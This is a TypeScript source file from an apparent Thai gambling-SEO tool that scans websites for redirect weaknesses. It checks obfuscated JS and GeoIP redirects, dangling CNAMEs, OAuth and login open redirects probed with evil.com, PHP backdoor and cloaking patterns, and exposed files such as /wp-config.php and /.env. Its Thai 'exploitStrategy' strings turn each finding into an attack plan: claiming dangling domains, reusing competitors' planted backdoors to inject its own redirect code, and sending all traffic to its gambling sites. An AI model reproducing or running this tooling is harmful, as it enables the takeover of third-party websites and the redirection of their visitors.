          details: `JavaScript redirect via ${pattern.name} → ${url}`,
        });
      }
    }
  }

  // Obfuscated JS (base64)
  const b64Matches = Array.from(body.matchAll(/atob\s*\(\s*["']([A-Za-z0-9+\/=]+)["']\s*\)/g));
  for (const m of b64Matches) {
    try {
      const decoded = Buffer.from(m[1], "base64").toString("utf-8");
      const urlMatch = decoded.match(/https?:\/\/[^\s"'<>]+/);
      if (urlMatch && !urlMatch[0].includes(domain)) {
        vulns.push({
          type: "js_redirect",
          severity: "high",
          location: "Obfuscated JS (base64)",
          vulnerableUrl: baseUrl,
          currentDestination: urlMatch[0],
          exploitable: true,
          exploitStrategy: `Obfuscated JS redirect ไป ${urlMatch[0]} — competitor ใช้ base64 ซ่อน URL`,
          confidence: 85,
          evidence: `Decoded: ${decoded.slice(0, 200)}`,
          details: `Base64 obfuscated redirect → ${urlMatch[0]}`,
        });
      }
    } catch {}
  }

  // GeoIP-based redirects (fetch API to country detection services)
  const geoPatterns = [
    /fetch\s*\(\s*["']https?:\/\/api\.country\.is/g,
    /fetch\s*\(\s*["']https?:\/\/ipapi\.co/g,
    /fetch\s*\(\s*["']https?:\/\/ip-api\.com/g,
    /fetch\s*\(\s*["']https?:\/\/geoip/g,
  ];
  for (const gp of geoPatterns) {
    if (gp.test(body)) {
      vulns.push({
        type: "js_redirect",
        severity: "high",
        location: "GeoIP-based JS redirect",
        vulnerableUrl: baseUrl,
        currentDestination: null,
        exploitable: true,
        exploitStrategy: `GeoIP cloaking redirect — competitor ใช้ GeoIP API เพื่อ redirect เฉพาะบาง country`,
        confidence: 75,
        evidence: `GeoIP API call detected in page source`,
        details: `พบ GeoIP-based redirect cloaking — redirect เฉพาะผู้ใช้จากบาง country`,
      });
      break;
    }
  }

  // Gambling/SEO content injection
  const gamblingKeywords = [
    "สล็อต", "บาคาร่า", "คาสิโน", "หวย", "แทงบอล", "เครดิตฟรี",
    "slot", "casino", "baccarat", "lottery", "betting",
    "เว็บตรง", "ไม่ผ่านเอเย่นต์", "ฝากถอน", "โบนัส", "PG SLOT",
  ];
  const gamblingCount = gamblingKeywords.filter(kw => body.toLowerCase().includes(kw.toLowerCase())).length;
  if (gamblingCount >= 3) {
    vulns.push({
      type: "content_injection",
      severity: "high",
      location: "Page body content",
      vulnerableUrl: baseUrl,
      currentDestination: null,
      exploitable: true,
      exploitStrategy: `พบ gambling content injection (${gamblingCount} keywords) — competitor ฝัง content แล้ว ใช้วิธีเดียวกันเปลี่ยนเป็นของเรา`,
      confidence: 70,
      evidence: `${gamblingCount} gambling keywords detected`,
      details: `Gambling/SEO spam content injected — ${gamblingCount} keywords matched`,
    });
  }

  return vulns;
}

// ═══════════════════════════════════════════════════════
//  SCAN 6: DNS CNAME / SUBDOMAIN DANGLING
// ═══════════════════════════════════════════════════════

async function scanDanglingDns(
  domain: string,
): Promise<RedirectVulnerability[]> {
  const vulns: RedirectVulnerability[] = [];

  // Check main domain CNAME
  const mainCnames = await dnsLookup(domain, "CNAME");
  for (const cname of mainCnames) {
    for (const fp of DANGLING_SERVICE_FINGERPRINTS) {
      if (cname.includes(fp.cname) && fp.claimable) {
        // Verify it's actually dangling by checking the service
        const checkResp = await directFetch(`https://${domain}`, {}, 5000);
        let isDangling = false;
        if (!checkResp) {
          isDangling = true;
        } else if (fp.response) {
          try {
            const body = await checkResp.text();
            if (body.includes(fp.response)) isDangling = true;
          } catch {}
        }

        if (isDangling) {
          vulns.push({
            type: "dangling_cname",
            severity: "critical",
            location: `DNS CNAME: ${domain} → ${cname}`,
            vulnerableUrl: `https://${domain}`,
            currentDestination: null,
            exploitable: true,
            exploitStrategy: `Domain ${domain} CNAME → ${cname} (${fp.service}) — สร้าง project บน ${fp.service} แล้ว claim domain นี้`,
            confidence: 90,
            evidence: `CNAME: ${domain} → ${cname}, service: ${fp.service}`,
            details: `Dangling CNAME: ${domain} ชี้ไป ${fp.service} ที่ไม่มี project — สามารถ takeover ได้`,
          });
        }
      }
    }
  }

  // Check common subdomains for dangling CNAME
  const commonSubs = ["www", "blog", "shop", "store", "app", "api", "cdn", "mail", "dev", "staging", "test", "old", "new", "m", "mobile"];
  const subChecks = commonSubs.map(async (sub) => {
    const fullDomain = `${sub}.${domain}`;
    const cnames = await dnsLookup(fullDomain, "CNAME");
    for (const cname of cnames) {
      for (const fp of DANGLING_SERVICE_FINGERPRINTS) {
        if (cname.includes(fp.cname) && fp.claimable) {
          const aRecords = await dnsLookup(cname, "A");
          if (aRecords.length === 0) {
            vulns.push({
              type: "dangling_cname",
              severity: "high",
              location: `Subdomain: ${fullDomain} → CNAME ${cname}`,
              vulnerableUrl: `https://${fullDomain}`,
              currentDestination: null,
              exploitable: true,
              exploitStrategy: `Subdomain ${fullDomain} CNAME → ${cname} (${fp.service}) — claim บน ${fp.service} แล้ว redirect`,
              confidence: 80,
              evidence: `CNAME: ${fullDomain} → ${cname} (no A record)`,
              details: `Dangling subdomain: ${fullDomain} → ${fp.service} (no A record)`,
            });
          }
        }
      }
    }
  });

  await Promise.allSettled(subChecks);
  return vulns;
}

// ═══════════════════════════════════════════════════════
//  SCAN 7: OAUTH / LOGIN REDIRECT ABUSE
// ═══════════════════════════════════════════════════════

async function scanOAuthRedirectAbuse(
  baseUrl: string,
  domain: string,
): Promise<RedirectVulnerability[]> {
  const vulns: RedirectVulnerability[] = [];

  // Common OAuth/SSO endpoints
  const oauthPaths = [
    "/oauth/authorize",
    "/oauth2/authorize",
    "/auth/authorize",
    "/connect/authorize",
    "/api/oauth/authorize",
    "/.well-known/openid-configuration",
  ];

  for (const path of oauthPaths) {
    const testUrl = `${baseUrl}${path}?redirect_uri=${encodeURIComponent("https://evil.com/callback")}&client_id=test&response_type=code`;
    const resp = await safeFetch(testUrl, { redirect: "manual" }, 5000);
    if (!resp) continue;

    if (resp.status >= 300 && resp.status < 400) {
      const location = resp.headers.get("location") || "";
      if (location.includes("evil.com")) {
        vulns.push({
          type: "oauth_redirect_abuse",
          severity: "critical",
          location: `OAuth: ${path}`,
          vulnerableUrl: testUrl,
          currentDestination: null,
          exploitable: true,
          exploitStrategy: `OAuth redirect_uri ไม่ validate — ใช้ ${baseUrl}${path}?redirect_uri=OUR_URL เพื่อ redirect ผ่าน OAuth flow`,
          confidence: 90,
          evidence: `OAuth redirect to evil.com: ${location}`,
          details: `OAuth endpoint ${path} ไม่ validate redirect_uri — open redirect ผ่าน OAuth`,
        });
      }
    }
  }

  // Login redirect abuse
  const loginPaths = [
    "/wp-login.php",
    "/login",
    "/signin",
    "/auth/login",
    "/account/login",
  ];

  for (const path of loginPaths) {
    const testUrl = `${baseUrl}${path}?redirect_to=${encodeURIComponent("https://evil.com")}`;
    const resp = await safeFetch(testUrl, { redirect: "manual" }, 5000);
    if (!resp) continue;

    // Check if the login page includes our evil URL in the form action or hidden field
    if (resp.status === 200) {
      try {
        const body = await resp.text();
        if (body.includes("evil.com") && (body.includes("redirect_to") || body.includes("redirect") || body.includes("next"))) {
          vulns.push({
            type: "login_redirect_abuse",
            severity: "medium",
            location: `Login: ${path}`,
            vulnerableUrl: testUrl,
            currentDestination: null,
            exploitable: true,
            exploitStrategy: `Login page ${path} accepts external redirect — after login, user gets redirected to our URL`,
            confidence: 60,
            evidence: `Login page includes evil.com in redirect parameter`,
            details: `Login redirect abuse: ${path} accepts external URLs in redirect parameter`,
          });
        }
      } catch {}
    }

    // Direct redirect after login
    if (resp.status >= 300 && resp.status < 400) {
      const location = resp.headers.get("location") || "";
      if (location.includes("evil.com")) {
        vulns.push({
          type: "login_redirect_abuse",
          severity: "high",
          location: `Login: ${path}`,
          vulnerableUrl: testUrl,
          currentDestination: null,
          exploitable: true,
          exploitStrategy: `Login page ${path} redirects to external URL directly — open redirect`,
          confidence: 85,
          evidence: `Login redirect to evil.com: ${location}`,
          details: `Login open redirect: ${path} → ${location}`,
        });
      }
    }
  }

  return vulns;
}

// ═══════════════════════════════════════════════════════
//  SCAN 8: PHP INDEX CODE DETECTION
// ═══════════════════════════════════════════════════════

/** Dangerous PHP function patterns to detect in page source */
const PHP_DANGER_PATTERNS: Array<{
  regex: RegExp;
  name: string;
  type: PhpCodeFinding["type"];
  severity: PhpCodeFinding["severity"];
  analysis: string;
}> = [
  // Execution / eval
  { regex: /eval\s*\(\s*(?:base64_decode|gzinflate|gzuncompress|str_rot13|rawurldecode|urldecode)\s*\(/gi, name: "eval+decode combo", type: "obfuscated", severity: "critical", analysis: "Obfuscated PHP code — มักเป็น backdoor หรือ redirect code ที่ถูกเข้ารหัส" },
  { regex: /eval\s*\(\s*["']?\$/gi, name: "eval($var)", type: "eval_exec", severity: "critical", analysis: "eval() กับ variable — อาจเป็น backdoor ที่รับ code จากภายนอก" },
  { regex: /eval\s*\(\s*['"][^'"]{20,}/gi, name: "eval(long_string)", type: "obfuscated", severity: "critical", analysis: "eval() กับ string ยาว — มักเป็น obfuscated malware" },
  { regex: /assert\s*\(\s*\$/gi, name: "assert($var)", type: "eval_exec", severity: "critical", analysis: "assert() ใช้เป็น eval() alternative — backdoor technique" },
  
  // Base64 decode chains
  { regex: /base64_decode\s*\(\s*['"][A-Za-z0-9+\/=]{50,}/gi, name: "base64_decode(long)", type: "obfuscated", severity: "critical", analysis: "Long base64 encoded string — มักเป็น malicious code ที่ถูกเข้ารหัส" },
  { regex: /gzinflate\s*\(\s*base64_decode/gi, name: "gzinflate+base64", type: "obfuscated", severity: "critical", analysis: "Double-encoded PHP code — classic malware obfuscation" },
  { regex: /str_rot13\s*\(\s*(?:base64_decode|gzinflate)/gi, name: "str_rot13+decode", type: "obfuscated", severity: "critical", analysis: "ROT13 + decode chain — heavy obfuscation = malicious" },
  { regex: /rawurldecode\s*\(\s*['"]%[0-9A-Fa-f]{2}/gi, name: "rawurldecode(encoded)", type: "obfuscated", severity: "high", analysis: "URL-encoded PHP code — obfuscation technique" },
  
  // Remote includes
  { regex: /(?:include|require|include_once|require_once)\s*\(?\s*['"]https?:\/\//gi, name: "remote include", type: "include_remote", severity: "critical", analysis: "Remote file include — โหลด code จากเซิร์ฟเวอร์ภายนอก" },
  { regex: /(?:include|require)\s*\(?\s*\$_(?:GET|POST|REQUEST|COOKIE)/gi, name: "include($_INPUT)", type: "include_remote", severity: "critical", analysis: "LFI/RFI — include จาก user input" },
  { regex: /file_get_contents\s*\(\s*['"]https?:\/\//gi, name: "file_get_contents(remote)", type: "include_remote", severity: "high", analysis: "Remote file fetch — อาจโหลด malicious content" },
  { regex: /curl_exec\s*\(/gi, name: "curl_exec", type: "include_remote", severity: "medium", analysis: "cURL execution — อาจใช้โหลด remote payload" },
  
  // System execution
  { regex: /(?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(/gi, name: "system/exec", type: "backdoor", severity: "critical", analysis: "System command execution — backdoor/webshell" },
  { regex: /`\$[^`]+`/g, name: "backtick exec", type: "backdoor", severity: "critical", analysis: "Backtick command execution — hidden backdoor" },
  
  // Redirect-specific PHP
  { regex: /header\s*\(\s*['"]Location:\s*https?:\/\/[^'"]+/gi, name: "header(Location:)", type: "redirect", severity: "high", analysis: "PHP header redirect — ใช้เปลี่ยนเส้นทาง redirect" },
  { regex: /wp_redirect\s*\(\s*['"]https?:\/\/[^'"]+/gi, name: "wp_redirect()", type: "redirect", severity: "high", analysis: "WordPress redirect function — redirect ผ่าน WP API" },
  { regex: /header\s*\(\s*['"]Refresh:\s*\d+;\s*url=/gi, name: "header(Refresh:)", type: "redirect", severity: "high", analysis: "PHP refresh header redirect" },
  
  // Cloaking (User-Agent / IP based)
  { regex: /\$_SERVER\s*\[\s*['"]HTTP_USER_AGENT['"]\s*\].*(?:googlebot|bingbot|spider|crawler|bot)/gi, name: "UA cloaking", type: "cloaking", severity: "high", analysis: "User-Agent cloaking — แสดงเนื้อหาต่างกันให้ bot กับ user" },
  { regex: /\$_SERVER\s*\[\s*['"]REMOTE_ADDR['"]\s*\].*(?:header|redirect|location)/gi, name: "IP-based redirect", type: "cloaking", severity: "high", analysis: "IP-based cloaking redirect — redirect เฉพาะบาง IP" },
  { regex: /\$_SERVER\s*\[\s*['"]HTTP_REFERER['"]\s*\].*(?:google|bing|yahoo|baidu)/gi, name: "Referer cloaking", type: "cloaking", severity: "high", analysis: "Referer-based cloaking — redirect เฉพาะ traffic จาก search engine" },
  
  // SEO spam injection
  { regex: /(?:echo|print)\s+['"]<a\s+href=['"]https?:\/\/[^'"]+['"][^>]*>.*?(?:สล็อต|casino|slot|หวย|betting)/gi, name: "SEO spam links", type: "seo_spam", severity: "high", analysis: "PHP echo SEO spam links — ฝัง gambling links ใน HTML" },
  { regex: /\$_COOKIE.*(?:eval|base64|exec|system)/gi, name: "cookie-based exec", type: "backdoor", severity: "critical", analysis: "Cookie-based code execution — hidden backdoor" },
  
  // preg_replace with /e modifier (deprecated but still used)
  { regex: /preg_replace\s*\(\s*['"].*\/e['"]\s*,/gi, name: "preg_replace /e", type: "eval_exec", severity: "critical", analysis: "preg_replace with /e modifier — code execution via regex" },
  
  // create_function (deprecated eval alternative)
  { regex: /create_function\s*\(/gi, name: "create_function", type: "eval_exec", severity: "high", analysis: "create_function() — deprecated eval() alternative, often used in malware" },
  
  // Variable function calls
  { regex: /\$[a-zA-Z_]+\s*\(\s*\$_(?:GET|POST|REQUEST)/gi, name: "$func($_INPUT)", type: "backdoor", severity: "critical", analysis: "Variable function call with user input — classic webshell pattern" },
];

/** Pages to scan for PHP code */
const PHP_SCAN_PAGES = [
  "/",
  "/index.php",
  "/index.html",
  "/wp-config.php",
  "/wp-includes/version.php",
  "/wp-content/themes/index.php",
  "/configuration.php",
  "/config.php",
  "/.env",
  "/xmlrpc.php",
  "/wp-cron.php",
  "/wp-blog-header.php",
];

async function scanPhpIndexCode(
  baseUrl: string,
  domain: string,
  extraPaths: string[] = [],
): Promise<{ findings: PhpCodeFinding[]; vulns: RedirectVulnerability[] }> {
  const findings: PhpCodeFinding[] = [];
  const vulns: RedirectVulnerability[] = [];
  const allPaths = Array.from(new Set([...PHP_SCAN_PAGES, ...extraPaths]));

  const scanPage = async (path: string) => {
    const url = `${baseUrl}${path}`;
    
    // Fetch with different User-Agents to detect cloaking
    const userAgents = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      "Googlebot/2.1 (+http://www.google.com/bot.html)",
    ];

    for (let uaIdx = 0; uaIdx < userAgents.length; uaIdx++) {
      const resp = await safeFetch(url, {
        headers: { "User-Agent": userAgents[uaIdx] },
        redirect: "follow",
      }, 6000);
      if (!resp || resp.status !== 200) continue;

      let body = "";
      try { body = await resp.text(); } catch { continue; }
      if (body.length < 10) continue;

      const uaLabel = uaIdx === 0 ? "browser" : "googlebot";

      // Check each PHP danger pattern
      for (const pattern of PHP_DANGER_PATTERNS) {
        const matches = body.match(pattern.regex);
        if (matches) {
          for (const match of matches.slice(0, 3)) { // Max 3 per pattern
            const finding: PhpCodeFinding = {
              type: pattern.type,
              pattern: pattern.name,
              codeSnippet: match.slice(0, 300),
              foundAt: `${url} (UA: ${uaLabel})`,
              severity: pattern.severity,
              analysis: pattern.analysis,
            };
            findings.push(finding);

            // Create vulnerability entry
            const vulnType: RedirectVulnerability["type"] = 
              pattern.type === "backdoor" ? "php_backdoor" :
              pattern.type === "cloaking" ? "php_cloaking" :
              "php_code_injection";

            vulns.push({
              type: vulnType,
              severity: pattern.severity,
              location: `PHP: ${pattern.name} at ${path} (${uaLabel})`,
              vulnerableUrl: url,
              currentDestination: null,
              exploitable: true,
              exploitStrategy: pattern.type === "redirect"
                ? `PHP redirect code ที่ ${path} — แก้ไข header(Location:) ให้ชี้มาที่เรา`
                : pattern.type === "cloaking"
                ? `Cloaking code ที่ ${path} — แก้ไข condition ให้ redirect ทุก traffic มาที่เรา`
                : pattern.type === "backdoor"
                ? `Backdoor ที่ ${path} — ใช้ backdoor เดิมเพื่อ inject redirect code ของเรา`
                : `PHP code ที่ ${path} — วิเคราะห์ decode แล้วแก้ไข redirect destination`,
              confidence: pattern.severity === "critical" ? 85 : 70,
              evidence: `Pattern: ${pattern.name}, Snippet: ${match.slice(0, 150)}`,
              details: `${pattern.analysis}\nFound at: ${url} (${uaLabel})`,
            });
          }
        }
      }

      // Detect cloaking by comparing browser vs bot response
      if (uaIdx === 1 && body.length > 100) {
        // Re-fetch with browser UA to compare
        const browserResp = await safeFetch(url, {
          headers: { "User-Agent": userAgents[0] },
          redirect: "follow",
        }, 6000);
        if (browserResp && browserResp.status === 200) {
          try {
            const browserBody = await browserResp.text();
            // Simple similarity check — if bodies differ significantly, it's cloaking
            const botLen = body.length;
            const browserLen = browserBody.length;
            const lenDiff = Math.abs(botLen - browserLen) / Math.max(botLen, browserLen);
            
            if (lenDiff > 0.5) { // More than 50% difference in length
              findings.push({
                type: "cloaking",
                pattern: "UA-based content cloaking",
                codeSnippet: `Browser: ${browserLen} bytes, Googlebot: ${botLen} bytes (${(lenDiff * 100).toFixed(0)}% diff)`,
                foundAt: url,
                severity: "critical",
                analysis: `เนื้อหาต่างกัน ${(lenDiff * 100).toFixed(0)}% ระหว่าง browser กับ Googlebot — cloaking ชัดเจน`,
              });
              vulns.push({
                type: "php_cloaking",
                severity: "critical",
                location: `Cloaking: ${path} (browser vs bot)`,
                vulnerableUrl: url,
                currentDestination: null,
                exploitable: true,
                exploitStrategy: `UA-based cloaking ที่ ${path} — เนื้อหาต่างกัน ${(lenDiff * 100).toFixed(0)}% — แก้ไข cloaking code ให้ redirect ทุก traffic`,
                confidence: 90,
                evidence: `Browser: ${browserLen}B, Bot: ${botLen}B, Diff: ${(lenDiff * 100).toFixed(0)}%`,
                details: `Content cloaking detected: browser sees ${browserLen} bytes, Googlebot sees ${botLen} bytes`,
              });
            }
          } catch {}
        }
      }
    }
  };

  // Scan all pages in parallel (max 6 concurrent)
  const chunks: string[][] = [];
  for (let i = 0; i < allPaths.length; i += 6) {
    chunks.push(allPaths.slice(i, i + 6));
  }
  for (const chunk of chunks) {
    await Promise.allSettled(chunk.map(p => scanPage(p)));
  }

  return { findings, vulns };
}

// ═══════════════════════════════════════════════════════
//  SCAN 9: PATH-SPECIFIC REDIRECT ANALYSIS
// ═══════════════════════════════════════════════════════

/** Scan specific URL paths for redirects (e.g., /menus, /events) */
async function scanPathSpecificRedirects(
  baseUrl: string,
  domain: string,
  targetPaths: string[],
): Promise<{ pathRedirects: PathRedirectInfo[]; vulns: RedirectVulnerability[] }> {
  const pathRedirects: PathRedirectInfo[] = [];
  const vulns: RedirectVulnerability[] = [];

  const gamblingKeywords = [
    "สล็อต", "บาคาร่า", "คาสิโน", "หวย", "แทงบอล", "เครดิตฟรี",
    "slot", "casino", "baccarat", "lottery", "betting",
    "เว็บตรง", "ไม่ผ่านเอเย่นต์", "ฝากถอน", "โบนัส", "PG SLOT",
  ];

  for (const path of targetPaths) {
    const fullUrl = `${baseUrl}${path}`;
    const info: PathRedirectInfo = {
      path,
      fullUrl,
      isRedirecting: false,
      destination: null,
      redirectType: null,
      statusCode: 0,
      phpCodeFound: [],
      hasGamblingContent: false,
    };

    // Step 1: Check server-side redirect (manual follow)
    const resp = await safeFetch(fullUrl, { redirect: "manual" }, 8000);
    if (!resp) {
      pathRedirects.push(info);
      continue;
    }

    info.statusCode = resp.status;

    // Server-side redirect
    if (resp.status >= 300 && resp.status < 400) {
      const location = resp.headers.get("location") || "";
      info.isRedirecting = true;
      info.destination = location;
      info.redirectType = String(resp.status);

      if (location && !location.includes(domain)) {
        vulns.push({
          type: "path_specific_redirect",
          severity: "high",
          location: `Path: ${path} (${resp.status})`,
          vulnerableUrl: fullUrl,
          currentDestination: location,
          exploitable: true,
          exploitStrategy: `Path ${path} redirect ${resp.status} → ${location} — เปลี่ยน redirect destination ที่ path นี้ให้ชี้มาที่เรา`,
          confidence: 80,
          evidence: `${resp.status} redirect: ${fullUrl} → ${location}`,
          details: `Path-specific redirect: ${path} → ${location}`,
        });
      }
    }

    // Step 2: Follow redirect and check final page
    const followResp = await safeFetch(fullUrl, { redirect: "follow" }, 8000);
    if (followResp && followResp.status === 200) {
      let body = "";
      try { body = await followResp.text(); } catch {}

      if (body.length > 0) {
        // Check for meta/JS redirects
        const metaMatch = body.match(/<meta\s+http-equiv=["']refresh["']\s+content=["']\d+;\s*url=([^"']+)["']/i);
        if (metaMatch && !metaMatch[1].includes(domain)) {
          info.isRedirecting = true;
          info.destination = metaMatch[1];
          info.redirectType = "meta";
          vulns.push({
            type: "path_specific_redirect",
            severity: "high",
            location: `Path: ${path} (meta refresh)`,
            vulnerableUrl: fullUrl,
            currentDestination: metaMatch[1],
            exploitable: true,
            exploitStrategy: `Meta refresh redirect ที่ ${path} → ${metaMatch[1]} — แก้ไข meta tag ให้ชี้มาที่เรา`,
            confidence: 80,
            evidence: metaMatch[0],
            details: `Path ${path} has meta refresh redirect → ${metaMatch[1]}`,
          });
        }

        const jsMatch = body.match(/(?:window\.)?location(?:\.href)?\s*=\s*["']([^"']+)["']/);
        if (jsMatch && jsMatch[1].startsWith("http") && !jsMatch[1].includes(domain)) {
          info.isRedirecting = true;
          info.destination = jsMatch[1];
          info.redirectType = "js";
          vulns.push({
            type: "path_specific_redirect",
            severity: "high",
            location: `Path: ${path} (JS redirect)`,
            vulnerableUrl: fullUrl,
            currentDestination: jsMatch[1],
            exploitable: true,
            exploitStrategy: `JS redirect ที่ ${path} → ${jsMatch[1]} — แก้ไข JavaScript ให้ redirect มาที่เรา`,
            confidence: 80,
            evidence: jsMatch[0].slice(0, 200),
            details: `Path ${path} has JS redirect → ${jsMatch[1]}`,
          });
        }

        // Check PHP code at this path
        for (const pattern of PHP_DANGER_PATTERNS) {
          const matches = body.match(pattern.regex);
          if (matches) {
            for (const match of matches.slice(0, 2)) {
              info.phpCodeFound.push({
                type: pattern.type,
                pattern: pattern.name,
                codeSnippet: match.slice(0, 300),
                foundAt: fullUrl,
                severity: pattern.severity,
                analysis: pattern.analysis,
              });
            }
          }
        }

        // Check gambling content
        const gamblingCount = gamblingKeywords.filter(kw => body.toLowerCase().includes(kw.toLowerCase())).length;
        info.hasGamblingContent = gamblingCount >= 3;
        if (info.hasGamblingContent) {
          vulns.push({
            type: "content_injection",
            severity: "high",
            location: `Path: ${path} (gambling content)`,
            vulnerableUrl: fullUrl,
            currentDestination: null,
            exploitable: true,
            exploitStrategy: `Gambling content (${gamblingCount} keywords) ที่ ${path} — competitor ฝัง content แล้ว เปลี่ยนเป็นของเรา`,
            confidence: 75,
            evidence: `${gamblingCount} gambling keywords at ${path}`,
            details: `Gambling/SEO content injection at ${path}`,
          });
        }
      }
    }

    pathRedirects.push(info);
  }

  return { pathRedirects, vulns };
}

// ═══════════════════════════════════════════════════════
//  SCAN 10: GEO-CLOAKING DETECTION
// ═══════════════════════════════════════════════════════

/**
 * Detect geo-cloaking: sites that show different content based on
 * User-Agent (Googlebot vs normal) or IP geolocation (Thai IP vs foreign).
 * 
 * Strategy: Send multiple requests with different User-Agents and compare responses.
 * If response differs significantly (redirect vs no redirect, gambling content vs clean),
 * it's cloaking.
 */
async function scanGeoCloaking(
  baseUrl: string,
  domain: string,
  targetUrl?: string,
): Promise<{ result: GeoCloakingResult; vulns: RedirectVulnerability[] }> {
  const vulns: RedirectVulnerability[] = [];
  const scanUrl = targetUrl || baseUrl;
  
  const gamblingKeywords = [
    "สล็อต", "บาคาร่า", "คาสิโน", "หวย", "แทงบอล", "เครดิตฟรี",
    "slot", "casino", "baccarat", "lottery", "betting",
    "เว็บตรง", "ไม่ผ่านเอเย่นต์", "ฝากถอน", "โบนัส", "PG SLOT",
    "pgslot", "joker", "สมัครสมาชิก", "ฝากขั้นต่ำ", "เว็บสล็อต",
    "แทงหวย", "หวยออนไลน์", "คาสิโนออนไลน์", "เว็บพนัน",
  ];

  const checkGambling = (body: string): { has: boolean; keywords: string[] } => {
    const found = gamblingKeywords.filter(kw => body.toLowerCase().includes(kw.toLowerCase()));
    return { has: found.length >= 3, keywords: found };
  };

  const getRedirectTarget = (resp: Response): string | null => {
    if (resp.status >= 300 && resp.status < 400) {
      return resp.headers.get("location") || null;
    }
    return null;
  };

  // ── Step 1: Normal request (baseline) ──
  const normalResp = await directFetch(scanUrl, { redirect: "manual" }, 8000);
  let normalBody = "";
  let normalStatus = 0;
  let normalRedirect: string | null = null;
  let normalGambling = { has: false, keywords: [] as string[] };
  
  if (normalResp) {
    normalStatus = normalResp.status;
    normalRedirect = getRedirectTarget(normalResp);
    if (normalResp.status === 200) {
      try { normalBody = await normalResp.text(); } catch {}
      normalGambling = checkGambling(normalBody);
    }
  }

  // ── Step 2: Test with different User-Agents ──
  const testAgents = [
    { name: "googlebot", ua: "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
    { name: "googlebot_mobile", ua: "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" },
    { name: "thai_mobile", ua: "Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" },
    { name: "bingbot", ua: "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" },
  ];

  const cloakedResponses: GeoCloakingResult["cloakedResponses"] = [];
  let allGamblingKeywords: string[] = [];

  for (const agent of testAgents) {
    // Try with proxy (different IP)
    const resp = await safeFetch(scanUrl, {
      redirect: "manual",
      headers: { "User-Agent": agent.ua },
    }, 8000);

    if (!resp) {
      cloakedResponses.push({
        method: agent.name,
        statusCode: 0,
        bodyLength: 0,
        hasGambling: false,
        redirectTo: null,
        bodyDiffPercent: 0,
      });
      continue;
    }

    const redirectTo = getRedirectTarget(resp);
    let body = "";
    let gambling = { has: false, keywords: [] as string[] };

    if (resp.status === 200) {
      try { body = await resp.text(); } catch {}
      gambling = checkGambling(body);
      allGamblingKeywords.push(...gambling.keywords);
    } else if (resp.status >= 300 && resp.status < 400 && redirectTo) {
      // Follow the redirect to check final destination
      const followResp = await safeFetch(redirectTo, {
        headers: { "User-Agent": agent.ua },
      }, 8000);
      if (followResp && followResp.status === 200) {
        try { body = await followResp.text(); } catch {}
        gambling = checkGambling(body);
        allGamblingKeywords.push(...gambling.keywords);
      }
    }

    // Calculate body difference
    const bodyDiffPercent = normalBody.length > 0 && body.length > 0
      ? Math.abs(normalBody.length - body.length) / Math.max(normalBody.length, body.length) * 100
      : (body.length > 0 && normalBody.length === 0 ? 100 : 0);

    cloakedResponses.push({
      method: agent.name,
      statusCode: resp.status,
      bodyLength: body.length,
      hasGambling: gambling.has,
      redirectTo,
      bodyDiffPercent,
    });
  }

  // ── Step 3: Also test with proxy + normal UA (detect IP-based cloaking) ──
  // Use multiple proxies to increase chance of hitting different geo
  const proxyTests = [
    { name: "proxy_residential_1", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" },
    { name: "proxy_residential_2", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" },
  ];

  for (const pt of proxyTests) {
    const resp = await safeFetch(scanUrl, {
      redirect: "manual",
      headers: { "User-Agent": pt.ua },
    }, 8000);

    if (!resp) continue;

    const redirectTo = getRedirectTarget(resp);
    let body = "";
    let gambling = { has: false, keywords: [] as string[] };

    if (resp.status === 200) {
      try { body = await resp.text(); } catch {}
      gambling = checkGambling(body);
      allGamblingKeywords.push(...gambling.keywords);
    } else if (resp.status >= 300 && resp.status < 400 && redirectTo) {
      const followResp = await safeFetch(redirectTo, {
        headers: { "User-Agent": pt.ua },
      }, 8000);
      if (followResp && followResp.status === 200) {
        try { body = await followResp.text(); } catch {}
        gambling = checkGambling(body);
        allGamblingKeywords.push(...gambling.keywords);
      }
    }

    const bodyDiffPercent = normalBody.length > 0 && body.length > 0
      ? Math.abs(normalBody.length - body.length) / Math.max(normalBody.length, body.length) * 100
      : (body.length > 0 && normalBody.length === 0 ? 100 : 0);

    cloakedResponses.push({
      method: pt.name,
      statusCode: resp.status,
      bodyLength: body.length,
      hasGambling: gambling.has,
      redirectTo,
      bodyDiffPercent,
    });
  }

  // ── Step 4: Analyze results ──
  const uniqueGamblingKeywords = Array.from(new Set(allGamblingKeywords));
  
  // Detect cloaking: any response has gambling content or redirect that normal doesn't
  const hasCloakedRedirect = cloakedResponses.some(r => r.redirectTo && !normalRedirect);
  const hasCloakedGambling = cloakedResponses.some(r => r.hasGambling && !normalGambling.has);
  const hasSignificantDiff = cloakedResponses.some(r => r.bodyDiffPercent > 50);
  const hasDifferentStatus = cloakedResponses.some(r => r.statusCode !== normalStatus && r.statusCode > 0);
  
  const detected = hasCloakedRedirect || hasCloakedGambling || (hasSignificantDiff && hasDifferentStatus);

  // Determine cloaking type
  let cloakingType: GeoCloakingResult["cloakingType"] = "none";
  if (detected) {
    const uaCloaked = cloakedResponses.filter(r => 
      r.method.includes("bot") && (r.hasGambling || r.redirectTo)
    ).length > 0;
    const ipCloaked = cloakedResponses.filter(r => 
      r.method.includes("proxy") && (r.hasGambling || r.redirectTo)
    ).length > 0;
    
    if (uaCloaked && ipCloaked) cloakingType = "combined";
    else if (uaCloaked) cloakingType = "user_agent";
    else if (ipCloaked) cloakingType = "geo_ip";
    else cloakingType = "combined";
  }

  // Build evidence
  const evidenceParts: string[] = [];
  for (const r of cloakedResponses) {
    if (r.hasGambling || r.redirectTo) {
